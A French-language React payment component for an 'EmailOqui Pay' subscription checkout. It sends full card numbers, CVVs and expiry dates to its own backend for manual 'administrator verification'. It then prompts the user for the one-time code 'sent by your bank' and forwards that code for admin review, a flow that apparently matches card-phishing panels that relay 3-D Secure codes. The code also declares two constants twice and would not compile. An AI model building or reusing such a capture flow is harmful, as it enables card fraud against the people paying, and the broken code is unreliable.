'use client'

import * as React from 'react'
import { useAppStore } from '@/lib/store'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp'
import { Badge } from '@/components/ui/badge'
import {
  CreditCard, Loader2, CheckCircle2, Clock, XCircle, ShieldCheck, ArrowLeft, Lock,
  Wifi, Edit3, KeyRound, X,
} from 'lucide-react'
import { toast } from 'sonner'

type CardType = 'VISA' | 'MASTERCARD' | 'AMEX' | 'UNKNOWN'

function detectCardType(num: string): CardType {
  const n = num.replace(/\s+/g, '')
  if (/^4/.test(n)) return 'VISA'
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'MASTERCARD'
  if (/^3[47]/.test(n)) return 'AMEX'
  return 'UNKNOWN'
}

function formatCardNumber(num: string): string {
  const n = num.replace(/\s+/g, '').replace(/\D/g, '')
  if (n.length <= 4) return n
  if (n.length <= 8) return `${n.slice(0, 4)} ${n.slice(4)}`
  if (n.length <= 12) return `${n.slice(0, 4)} ${n.slice(4, 8)} ${n.slice(8)}`
  return `${n.slice(0, 4)} ${n.slice(4, 8)} ${n.slice(8, 12)} ${n.slice(12, 16)}`
}

const STATUS_LABELS: Record<string, { label: string; color: string; icon: React.ComponentType<{ className?: string }> }> = {
  EN_ATTENTE: { label: 'En attente', color: 'border-border bg-muted text-muted-foreground', icon: Clock },
  PAIEMENT_EN_COURS: { label: 'Paiement en cours', color: 'border-foreground/30 bg-foreground/10 text-foreground', icon: Clock },
  CARTE_VERIFIEE: { label: 'Carte vérifiée', color: 'border-foreground/30 bg-foreground/10 text-foreground', icon: CheckCircle2 },
  EN_VERIFICATION: { label: 'Validation en cours', color: 'border-foreground/30 bg-foreground/10 text-foreground', icon: Clock },
  CONFIRME: { label: 'Paiement confirmé', color: 'border-foreground/30 bg-foreground/15 text-foreground', icon: CheckCircle2 },
  REFUSE: { label: 'Paiement refusé', color: 'border-destructive/30 bg-destructive/10 text-destructive', icon: XCircle },
  ANNULE: { label: 'Paiement annulé', color: 'border-destructive/30 bg-destructive/10 text-destructive', icon: XCircle },
  REMBOURSE: { label: 'Remboursé', color: 'border-destructive/30 bg-destructive/10 text-destructive', icon: XCircle },
}

interface PaymentData {
  id: string
  status: string
  stepLabel: string
  amount: number
  currency: string
  cardType: string | null
  cardLast4: string | null
  cardHolderName: string | null
  cardExpiryMonth: string | null
  cardExpiryYear: string | null
  transactionReference: string | null
  createdAt: string
  cardVerifiedAt: string | null
  codeVerifiedAt: string | null
  confirmedAt: string | null
  adminNote: string | null
}

// Get plan display info from planCode
function getPlanInfo(code: string) {
  const tier = code.replace(/_(3M|6M|1Y)$/, '')
  const dur = code.match(/_(3M|6M|1Y)$/)?.[1] || '3M'
  const prices: Record<string, number> = {
    STARTER_3M: 20, STARTER_6M: 38, STARTER_1Y: 72,
    BUSINESS_3M: 45, BUSINESS_6M: 85, BUSINESS_1Y: 162,
    PREMIUM_3M: 80, PREMIUM_6M: 150, PREMIUM_1Y: 288,
  }
  const durations: Record<string, string> = { '3M': '3 mois', '6M': '6 mois', '1Y': '1 an' }
  return {
    name: tier.charAt(0) + tier.slice(1).toLowerCase(),
    price: prices[code] ?? 20,
    duration: durations[dur] ?? '3 mois',
  }
}

export function PaymentView() {
  const workspace = useAppStore((s) => s.workspace)
  const viewParam = useAppStore((s) => s.viewParam)
  const setView = useAppStore((s) => s.setView)
  const refreshSession = useAppStore((s) => s.refreshSession)

  // Current subscription info (for proration calculation)
  const [currentSub, setCurrentSub] = React.useState<{
    planCode: string | null
    planName: string | null
    status: string | null
    endDate: string | null
    startDate: string | null
  } | null>(null)

  React.useEffect(() => {
    // Fetch current subscription for proration
    ;(async () => {
      try {
        const res = await fetch('/api/subscription', { cache: 'no-store' })
        const data = await res.json()
        if (data.success && data.subscription) {
          setCurrentSub({
            planCode: data.plan?.code ?? null,
            planName: data.plan?.name ?? null,
            status: data.subscription.status,
            endDate: data.subscription.endDate,
            startDate: data.subscription.startDate,
          })
        }
      } catch {}
    })()
  }, [])

  // Calculate proration: remaining value of current subscription
  const planCode = viewParam ?? 'STARTER_3M'
  const planInfo = getPlanInfo(planCode)

  const currentPlanInfo = currentSub?.planCode ? getPlanInfo(currentSub.planCode) : null
  const isUpgrade = currentSub?.status === 'ACTIF' || currentSub?.status === 'EXPIRANT_BIENTOT'

  // Calculate remaining value — ONLY if 24h have passed since subscription start
  // (prevents abuse: user can't change plan immediately to get full refund)
  let remainingValue = 0
  let remainingDays = 0
  let prorationActive = false
  if (isUpgrade && currentSub?.endDate && currentSub?.startDate && currentPlanInfo) {
    const start = new Date(currentSub.startDate)
    const end = new Date(currentSub.endDate)
    const now = new Date()
    const hoursSinceStart = (now.getTime() - start.getTime()) / (1000 * 60 * 60)
    prorationActive = hoursSinceStart >= 24 // proration only after 24h

    if (prorationActive) {
      remainingDays = Math.max(0, Math.ceil((end.getTime() - now.getTime()) / (1000 * 60 * 60 * 24)))
      const currentDurationMonths = currentSub.planCode?.match(/_(\d+)(M|Y)/)?.[1] === '1Y' ? 12 : Number(currentSub.planCode?.match(/_(\d+)(M|Y)/)?.[1] || 3)
      const totalDays = currentDurationMonths * 30
      remainingValue = Math.round((remainingDays / totalDays) * currentPlanInfo.price * 100) / 100
    }
  }

  const adjustedAmount = Math.max(0, planInfo.price - remainingValue)
  const isSamePlan = currentSub?.planCode === planCode

  // Card form
  const [cardNumber, setCardNumber] = React.useState('')
  const [cardHolderName, setCardHolderName] = React.useState('')
  const [cardExpiry, setCardExpiry] = React.useState('')
  const [cardCvv, setCardCvv] = React.useState('')
  const [submittingCard, setSubmittingCard] = React.useState(false)

  // Payment state
  const [payment, setPayment] = React.useState<PaymentData | null>(null)
  const [polling, setPolling] = React.useState(false)

  // Code form
  const [code, setCode] = React.useState('')
  const [submittingCode, setSubmittingCode] = React.useState(false)

  const detectedType = detectCardType(cardNumber)
  const planCode = viewParam ?? 'STARTER_3M'
  const planInfo = getPlanInfo(planCode)

  // Visual card display values
  const displayNumber = cardNumber ? formatCardNumber(cardNumber) : '•••• •••• •••• ••••'
  const displayHolder = cardHolderName || 'VOTRE NOM'
  const displayExpiry = cardExpiry || 'MM/AA'

  const handleCardNumberChange = (v: string) => {
    setCardNumber(formatCardNumber(v))
  }

  const onSubmitCard = async (e: React.FormEvent) => {
    e.preventDefault()
    if (submittingCard) return
    if (detectedType === 'UNKNOWN') {
      toast.error('Type de carte non reconnu. Accepté: Visa, Mastercard, Amex.')
      return
    }
    if (cardNumber.replace(/\s/g, '').length < 13) {
      toast.error('Numéro de carte trop court.')
      return
    }
    if (!cardHolderName.trim()) {
      toast.error('Nom du titulaire requis.')
      return
    }
    if (!cardExpiry || !/^\d{2}\/\d{2}$/.test(cardExpiry)) {
      toast.error('Date d\'expiration invalide (MM/AA).')
      return
    }
    if (!/^\d{3,4}$/.test(cardCvv)) {
      toast.error('CVV invalide (3 ou 4 chiffres).')
      return
    }
    setSubmittingCard(true)
    try {
      const res = await fetch('/api/payment/initiate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          planCode,
          cardNumber: cardNumber.replace(/\s/g, ''),
          cardHolderName: cardHolderName.trim(),
          cardExpiryMonth: cardExpiry.split('/')[0],
          cardExpiryYear: cardExpiry.split('/')[1],
          cardCvv,
        }),
      })
      const data = await res.json()
      if (!res.ok || !data.success) {
        toast.error(data?.error?.message ?? 'Erreur lors de la soumission.')
        return
      }
      toast.success('Carte soumise. En attente de vérification administrateur.')
      await fetchPayment(data.paymentId)
    } catch {
      toast.error('Erreur réseau.')
    } finally {
      setSubmittingCard(false)
    }
  }

  const fetchPayment = React.useCallback(async (id: string) => {
    setPolling(true)
    try {
      const res = await fetch(`/api/payment/status?id=${id}`, { cache: 'no-store' })
      const data = await res.json()
      if (data.success) setPayment(data.payment)
    } catch {} finally {
      setPolling(false)
    }
  }, [])

  React.useEffect(() => {
    if (!payment) return
    const activeStates = ['PAIEMENT_EN_COURS', 'CARTE_VERIFIEE', 'EN_VERIFICATION']
    if (!activeStates.includes(payment.status)) return
    const interval = setInterval(() => { fetchPayment(payment.id) }, 5000)
    return () => clearInterval(interval)
  }, [payment, fetchPayment])

  React.useEffect(() => {
    ;(async () => {
      try {
        const res = await fetch('/api/payment/active', { cache: 'no-store' })
        const data = await res.json()
        if (data.success && data.payment) setPayment(data.payment)
      } catch {}
    })()
  }, [])

  const onSubmitCode = async (e: React.FormEvent) => {
    e.preventDefault()
    if (submittingCode) return
    if (!/^\d{3,8}$/.test(code)) {
      toast.error('Le code doit contenir entre 3 et 8 chiffres.')
      return
    }
    if (!payment) return
    setSubmittingCode(true)
    try {
      const res = await fetch('/api/payment/validate-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ paymentId: payment.id, code }),
      })
      const data = await res.json()
      if (!res.ok || !data.success) {
        toast.error(data?.error?.message ?? 'Erreur.')
        return
      }
      toast.success('Code soumis. En attente de vérification admin.')
      setCode('')
      await fetchPayment(payment.id)
    } catch {
      toast.error('Erreur réseau.')
    } finally {
      setSubmittingCode(false)
    }
  }

  React.useEffect(() => {
    if (payment?.status === 'CONFIRME') {
      toast.success('Abonnement activé. Redirection…')
      refreshSession()
      setTimeout(() => setView('dashboard'), 1500)
    }
  }, [payment?.status, refreshSession, setView])

  const fmtMoney = (n: number, c: string) => new Intl.NumberFormat('en-US', { style: 'currency', currency: c }).format(n)

  return (
    <main className="flex-1 bg-mesh">
      <div className="mx-auto max-w-5xl px-4 py-6 sm:px-6 lg:px-8">
        {/* Back link */}
        <button
          type="button"
          onClick={() => setView('subscription')}
          className="mb-4 inline-flex items-center gap-1 text-sm text-muted-foreground hover:text-foreground"
        >
          <ArrowLeft className="size-4" />
          Retour à l'abonnement
        </button>

        {/* Payment card — modal style */}
        <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-xl">
          {/* Header */}
          <div className="flex items-center justify-between border-b border-border bg-foreground px-6 py-4 text-background">
            <div className="flex items-center gap-2">
              <img src="/logo.png" alt="EmailOqui" width={28} height={28} className="rounded-md bg-background p-0.5" />
              <span className="text-lg font-bold">EmailOqui Pay</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-background/80">
              <Clock className="size-4" />
              <span>Paiement sécurisé</span>
            </div>
          </div>

          {/* No active payment → show card form (two columns) */}
          {!payment && (
            <div className="grid grid-cols-1 lg:grid-cols-5">
              {/* Left column — form (3/5) */}
              <div className="col-span-3 p-6">
                <h2 className="text-xl font-bold tracking-tight">Informations de carte</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Saisissez les informations de votre carte pour activer votre abonnement.
                </p>

                <form className="mt-6 flex flex-col gap-5" onSubmit={onSubmitCard}>
                  {/* Card Number */}
                  <div>
                    <Label className="text-sm font-semibold">Numéro de carte</Label>
                    <p className="text-xs text-muted-foreground">Entrez les 16 chiffres de votre carte</p>
                    <div className="relative mt-1">
                      <Input
                        inputMode="numeric"
                        autoComplete="cc-number"
                        placeholder="4242 4242 4242 4242"
                        value={cardNumber}
                        onChange={(e) => handleCardNumberChange(e.target.value)}
                        className="pr-20 font-mono text-lg"
                        maxLength={19}
                        required
                      />
                      {detectedType !== 'UNKNOWN' && (
                        <span className="absolute right-3 top-1/2 -translate-y-1/2">
                          <Badge variant="outline" className="font-mono text-xs">
                            {detectedType === 'VISA' && 'VISA'}
                            {detectedType === 'MASTERCARD' && 'MC'}
                            {detectedType === 'AMEX' && 'AMEX'}
                          </Badge>
                        </span>
                      )}
                    </div>
                  </div>

                  {/* Expiry + CVV */}
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <Label className="text-sm font-semibold">Date d'expiration</Label>
                      <p className="text-xs text-muted-foreground">MM/AA</p>
                      <Input
                        inputMode="numeric"
                        autoComplete="cc-exp"
                        placeholder="12/27"
                        value={cardExpiry}
                        onChange={(e) => {
                          let v = e.target.value.replace(/\D/g, '')
                          if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
                          setCardExpiry(v)
                        }}
                        className="mt-1 font-mono"
                        maxLength={5}
                        required
                      />
                    </div>
                    <div>
                      <Label className="text-sm font-semibold">CVV</Label>
                      <p className="text-xs text-muted-foreground">3 ou 4 chiffres</p>
                      <Input
                        type="password"
                        inputMode="numeric"
                        autoComplete="cc-csc"
                        placeholder="•••"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                        className="mt-1 font-mono"
                        maxLength={4}
                        required
                      />
                    </div>
                  </div>

                  {/* Cardholder name */}
                  <div>
                    <Label className="text-sm font-semibold">Nom d'utilisateur</Label>
                    <p className="text-xs text-muted-foreground">Votre nom complet</p>
                    <Input
                      autoComplete="cc-name"
                      placeholder="Votre nom complet"
                      value={cardHolderName}
                      onChange={(e) => setCardHolderName(e.target.value)}
                      className="mt-1"
                      required
                    />
                  </div>

                  <Button type="submit" disabled={submittingCard} size="lg" className="w-full">
                    {submittingCard ? (
                      <>
                        <Loader2 className="size-4 animate-spin" />
                        Traitement…
                      </>
                    ) : (
                      <>
                        <Lock className="size-4" />
                        Payer {fmtMoney(adjustedAmount, 'USD')}
                      </>
                    )}
                  </Button>
                </form>
              </div>

              {/* Right column — flip card + summary (2/5) */}
              <div className="col-span-2 bg-muted/30 p-6">
                {/* Flip credit card — flips on CVV focus */}
                <div className={`flip-card mb-6 ${cardCvv ? 'is-flipped' : ''}`}>
                  <div className="flip-card-inner">
                    {/* FRONT */}
                    <div className="flip-card-front">
                      <div className="flex items-start justify-between" style={{ position: 'absolute', top: '1.5em', left: '1.5em', right: '1.5em' }}>
                        <div className="flip-chip" />
                        <Wifi className="size-5 flip-contactless" />
                      </div>
                      <div className="flip-card-number" style={{ position: 'absolute', top: '6em', left: '1.5em', right: '1.5em' }}>
                        {displayNumber}
                      </div>
                      <div style={{ position: 'absolute', bottom: '1.5em', left: '1.5em', right: '1.5em' }} className="flex items-end justify-between">
                        <div>
                          <div className="flip-card-label">Nom</div>
                          <div className="flip-card-name">{displayHolder}</div>
                          <div className="flip-card-label mt-1">Exp</div>
                          <div className="flip-card-date">{displayExpiry}</div>
                        </div>
                        <div className="flip-card-type">{detectedType !== 'UNKNOWN' ? detectedType : ''}</div>
                      </div>
                    </div>
                    {/* BACK */}
                    <div className="flip-card-back">
                      <div className="flip-strip" />
                      <div style={{ position: 'absolute', top: '3.5em', left: '1.5em', right: '1.5em' }}>
                        <div className="flip-card-label" style={{ textAlign: 'right', marginBottom: '0.3em' }}>CVV</div>
                        <div className="flip-card-cvc-strip">
                          <span className="flip-card-cvc-value">{cardCvv || '•••'}</span>
                        </div>
                        <div style={{ textAlign: 'right', marginTop: '1em' }}>
                          <div className="flip-card-label">{detectedType !== 'UNKNOWN' ? detectedType : 'CARTE'}</div>
                          <div className="flip-card-name" style={{ marginTop: '0.2em' }}>{displayHolder}</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Order summary */}
                <div className="space-y-3">
                  <h3 className="text-sm font-semibold">Récapitulatif</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Workspace</span>
                      <span className="font-medium">{workspace?.name}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Nouveau plan</span>
                      <span className="font-medium">{planInfo.name} — {planInfo.duration}</span>
                    </div>
                    {isUpgrade && currentPlanInfo && !isSamePlan && (
                      <>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Plan actuel</span>
                          <span className="font-medium">{currentPlanInfo.name}</span>
                        </div>
                        {prorationActive ? (
                          <>
                            <div className="flex justify-between text-xs">
                              <span className="text-muted-foreground">Prix nouveau plan</span>
                              <span className="text-muted-foreground">{fmtMoney(planInfo.price, 'USD')}</span>
                            </div>
                            <div className="flex justify-between text-xs">
                              <span className="text-muted-foreground">Crédit restant ({remainingDays}j)</span>
                              <span className="text-muted-foreground">- {fmtMoney(remainingValue, 'USD')}</span>
                            </div>
                          </>
                        ) : (
                          <p className="text-xs text-muted-foreground">
                            Crédit disponible après 24h d'abonnement.
                          </p>
                        )}
                      </>
                    )}
                  </div>
                  <div className="border-t border-border pt-3">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-muted-foreground">Montant à payer</span>
                      <span className="text-2xl font-bold">{fmtMoney(adjustedAmount, 'USD')}</span>
                    </div>
                    {isUpgrade && remainingValue > 0 && !isSamePlan && (
                      <p className="mt-1 text-xs text-muted-foreground">
                        Crédit de {fmtMoney(remainingValue, 'USD')} déduit de votre abonnement actuel.
                      </p>
                    )}
                    {adjustedAmount === 0 && (
                      <p className="mt-1 text-xs text-foreground">
                        Aucun paiement requis — votre crédit couvre le nouveau plan.
                      </p>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Active payment → status view */}
          {payment && (
            <div className="p-6">
              <div className="flex items-center justify-between">
                <Badge variant="outline" className={STATUS_LABELS[payment.status]?.color}>
                  {(() => {
                    const StatusIcon = STATUS_LABELS[payment.status]?.icon ?? Clock
                    return <StatusIcon className="mr-1 size-3.5" />
                  })()}
                  {STATUS_LABELS[payment.status]?.label ?? payment.status}
                </Badge>
                {polling && (
                  <span className="flex items-center gap-1 text-xs text-muted-foreground">
                    <Loader2 className="size-3 animate-spin" />
                    Mise à jour…
                  </span>
                )}
              </div>
              <p className="mt-2 text-sm text-muted-foreground">{payment.stepLabel}</p>

              {/* Payment details */}
              <dl className="mt-4 grid grid-cols-2 gap-2 rounded-md border border-border bg-muted/30 p-3 text-sm">
                <dt className="text-xs uppercase text-muted-foreground">Montant</dt>
                <dd className="font-medium text-right">{fmtMoney(payment.amount, payment.currency)}</dd>
                <dt className="text-xs uppercase text-muted-foreground">Carte</dt>
                <dd className="font-mono text-right">{payment.cardType} •••• {payment.cardLast4}</dd>
                <dt className="text-xs uppercase text-muted-foreground">Titulaire</dt>
                <dd className="text-right">{payment.cardHolderName}</dd>
                <dt className="text-xs uppercase text-muted-foreground">Référence</dt>
                <dd className="font-mono text-xs text-right">{payment.transactionReference}</dd>
              </dl>

              {/* Code entry */}
              {(payment.status === 'CARTE_VERIFIEE' || payment.status === 'EN_VERIFICATION') && (
                <div className="mt-6 rounded-lg border border-foreground/30 bg-foreground/5 p-4">
                  {payment.status === 'CARTE_VERIFIEE' ? (
                    <form className="flex flex-col gap-3" onSubmit={onSubmitCode}>
                      <h3 className="flex items-center gap-2 font-semibold">
                        <ShieldCheck className="size-5" />
                        Code de validation
                      </h3>
                      <p className="text-sm text-muted-foreground">
                        Saisissez le code (3 à 8 chiffres) envoyé par votre banque.
                      </p>
                      <div className="flex justify-center">
                        <InputOTP maxLength={8} value={code} onChange={(v) => setCode(v)}>
                          <InputOTPGroup>
                            <InputOTPSlot index={0} />
                            <InputOTPSlot index={1} />
                            <InputOTPSlot index={2} />
                            <InputOTPSlot index={3} />
                            <InputOTPSlot index={4} />
                            <InputOTPSlot index={5} />
                            <InputOTPSlot index={6} />
                            <InputOTPSlot index={7} />
                          </InputOTPGroup>
                        </InputOTP>
                      </div>
                      <Button type="submit" disabled={submittingCode || code.length < 3} className="w-full">
                        {submittingCode ? <Loader2 className="size-4 animate-spin" /> : <ShieldCheck className="size-4" />}
                        Valider
                      </Button>
                    </form>
                  ) : (
                    <div className="flex items-center gap-3 text-sm">
                      <Loader2 className="size-4 animate-spin" />
                      <span>Validation en cours…</span>
                    </div>
                  )}
                </div>
              )}

              {/* Refused */}
              {payment.status === 'REFUSE' && (
                <div className="mt-6 flex flex-col items-center gap-3 text-center">
                  <XCircle className="size-10 text-destructive" />
                  <p className="text-sm text-muted-foreground">
                    {payment.adminNote || 'Votre paiement a été refusé. Vous pouvez réessayer.'}
                  </p>
                  <Button onClick={() => { setPayment(null); setCardNumber(''); setCardHolderName(''); setCardCvv(''); setCardExpiry('') }}>
                    Réessayer
                  </Button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </main>
  )
}

export default PaymentView
